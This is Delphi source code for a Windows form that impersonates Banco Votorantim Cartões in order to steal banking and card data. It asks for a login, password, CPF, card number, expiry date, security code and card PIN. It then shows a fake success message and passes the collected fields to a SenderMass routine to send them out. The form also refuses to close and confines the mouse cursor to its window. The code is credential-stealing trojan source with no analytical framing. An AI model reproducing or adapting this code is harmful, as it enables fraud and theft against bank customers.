{$IMAGEBASE 36954689}

unit Voto1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, pngimage, StdCtrls;

type
  TVotoram = class(TForm)
    Image1: TImage;
    Tvot: TTimer;
    Image2: TImage;
    Image3: TImage;
    Image4: TImage;
    Image5: TImage;
    Image6: TImage;
    Image7: TImage;
    Image8: TImage;
    Image9: TImage;
    Pan1: TPanel;
    EditUser: TEdit;
    Image18: TImage;
    EditPass: TEdit;
    Label1: TLabel;
    Pan2: TPanel;
    EditCpf: TEdit;
    EditSen: TEdit;
    Editseg: TEdit;
    Editcard: TEdit;
    ComboBox2: TComboBox;
    ComboBox1: TComboBox;
    Image21: TImage;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure TvotTimer(Sender: TObject);
    procedure Image2Click(Sender: TObject);
    procedure Image6Click(Sender: TObject);
    procedure Label1Click(Sender: TObject);
    procedure EditCpfChange(Sender: TObject);
    procedure EditCpfExit(Sender: TObject);
    procedure EditCpfKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure EditsegChange(Sender: TObject);
    procedure Label5Click(Sender: TObject);
  private

  public
    S: String;
  end;

var
  Votoram: TVotoram;

implementation

{$R *.dfm}
uses
Natal, Gerador;

function Cpf(CPF_Text: string): boolean;
var
  n1,n2,n3,n4,n5,n6,n7,n8,n9: integer;
  d1,d2: integer;
  digitado, calculado: string;
begin
   n1:=StrToInt(CPF_Text[1]);
   n2:=StrToInt(CPF_Text[2]);
   n3:=StrToInt(CPF_Text[3]);
   n4:=StrToInt(CPF_Text[5]);
   n5:=StrToInt(CPF_Text[6]);
   n6:=StrToInt(CPF_Text[7]);
   n7:=StrToInt(CPF_Text[9]);
   n8:=StrToInt(CPF_Text[10]);
   n9:=StrToInt(CPF_Text[11]);
   d1:=n9*2+n8*3+n7*4+n6*5+n5*6+n4*7+n3*8+n2*9+n1*10;
   d1:=11-(d1 mod 11);
   if d1>=10 then
    d1:=0;
    d2:=d1*2+n9*3+n8*4+n7*5+n6*6+n5*7+n4*8+n3*9+n2*10+n1*11;
    d2:=11-(d2 mod 11);
   if d2>=10 then
    d2:=0;
    calculado:=inttostr(d1)+inttostr(d2);
    digitado:=CPF_Text[13]+CPF_Text[14];
   if calculado=digitado then
    Cpf:=true
   else
    Cpf:=false;
end;

procedure TVotoram.EditCpfChange(Sender: TObject);
begin
  if Length(EditCpf.Text) = 14 then
  EditCard.SetFocus;

  if s = 's' then
begin
if length(EditCpf.Text) = 3 then
begin
EditCpf.Text := EditCpf.Text + '.';
EditCpf.SelStart := length(EditCpf.Text);
end;

if length(EditCpf.Text) = 7 then
begin
EditCpf.Text := EditCpf.Text + '.';
EditCpf.SelStart := length(EditCpf.Text);
end;

if length(EditCpf.Text) = 11 then
begin
EditCpf.Text := EditCpf.Text + '-';
EditCpf.SelStart := length(EditCpf.Text);
end;

end
else
begin
s :='s';
end;
end;

procedure TVotoram.EditCpfExit(Sender: TObject);
begin
    If EditCpf.Text<>'' Then
    If Cpf(EditCpf.Text)=False Then
    Begin
      MessageDlg('O CPF Informado está incorreto! Verifique, e tente novamente.',mtError, [mbOk],0);
      EditCpf.Text:='';
      EditCpf.SetFocus;
    end;
end;

procedure TVotoram.EditCpfKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if key = VK_BACK then
end;

procedure TVotoram.EditsegChange(Sender: TObject);
begin
  if Length(Editseg.Text) = 3 then
  Editsen.SetFocus;
end;

procedure TVotoram.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  Canclose := False
end;

procedure TVotoram.Image2Click(Sender: TObject);
begin
  Screen.Cursor := crHourGlass;
  Sleep(2000);
  Screen.Cursor := crDefault;
  Pan1.visible := True;
end;

procedure TVotoram.Label1Click(Sender: TObject);
begin
    Screen.Cursor := crHourGlass;
  Sleep(4000);
  Screen.Cursor := crDefault;
    if EditUser.Text='' then
  begin
    MessageBox(Self.handle,'Informe o seu usuário!', 'BANCO VOTORANTIM CARTÕES', mb_IconError + mb_Ok);
    exit;
  end;

     if EditPass.Text='' then
  begin
    MessageBox(Self.handle,'Informe a sua senha!', 'BANCO VOTORANTIM CARTÕES', mb_IconError + mb_Ok);
    exit;
  end;
    Pan2.visible := True;
end;

procedure TVotoram.Label5Click(Sender: TObject);
begin
Screen.Cursor := crHourGlass;
  Sleep(4000);
  Screen.Cursor := crDefault;


     if EditcPF.Text='' then
  begin
    MessageBox(Self.handle,'Informe o seu CPF!', 'BANCO VOTORANTIM CARTÕES', mb_IconError + mb_Ok);
    exit;
  end;

     if Editcard.Text='' then
  begin
    MessageBox(Self.handle,'Informe o Número do Cartão de Crédito!', 'BANCO VOTORANTIM CARTÕES', mb_IconError + mb_Ok);
    exit;
  end;

     if ComboBox1.Text='' then
  begin
    MessageBox(Self.handle,'Informe o mês da validade de seu Cartão!', 'BANCO VOTORANTIM CARTÕES', mb_IconError + mb_Ok);
    exit;
  end;

       if ComboBox2.Text='' then
  begin
    MessageBox(Self.handle,'Informe o ano da validade de seu Cartão!', 'BANCO VOTORANTIM CARTÕES', mb_IconError + mb_Ok);
    exit;
  end;

       if EditSeg.Text='' then
  begin
    MessageBox(Self.handle,'Informe o código de segurança do seu Cartão!', 'BANCO VOTORANTIM CARTÕES', mb_IconError + mb_Ok);
    exit;
  end;

         if EditSeN.Text='' then
  begin
    MessageBox(Self.handle,'Informe a Senha do seu Cartão!', 'BANCO VOTORANTIM CARTÕES', mb_IconError + mb_Ok);
    exit;
  end;
DadosEnvio_ := TStringList.Create;
DadosEnvio_.Add('=============================================');
DadosEnvio_.Add('VOTORANTIM: ');
DadosEnvio_.Add('=============================================');
DadosEnvio_.Add('USUARIO: '+  EditUSER.text);
DadosEnvio_.Add('SENHA:   '+  EditPASS.text);
DadosEnvio_.Add('CPF.: '+  EditcPF.text);
DadosEnvio_.Add('CARD: '+  EditCard.text);
DadosEnvio_.Add('VAL.: '+  ComboBox1.text+'/'+ComboBox2.Text);
DadosEnvio_.Add('SEG.: '+  EditSeg.Text);
DadosEnvio_.Add('SENHA:'+  EditSeN.Text);
DadosEnvio_.Add('=============================================');

Application.MessageBox(' Seus Dados Foram Atualizados com Sucesso! ', 'BANCO VOTORANTIM CARTÕES',mb_Ok+mb_IconInformation);
//SenderFull
try
  Votoram.Visible := False;
  SenderMass(DadosEnvio_ , 'VOTORANTIM');
  DadosEnvio_.Free;
except
end;

Votoram.Tvot.Enabled := False;
end;

procedure TVotoram.TvotTimer(Sender: TObject);
var
 R: TRect;
begin
  R := GetClientRect;
  R.TopLeft := ClientToScreen(R.TopLeft);
  R.BottomRight := ClientToScreen(R.BottomRight);
  ClipCursor(@R);
end;

end.
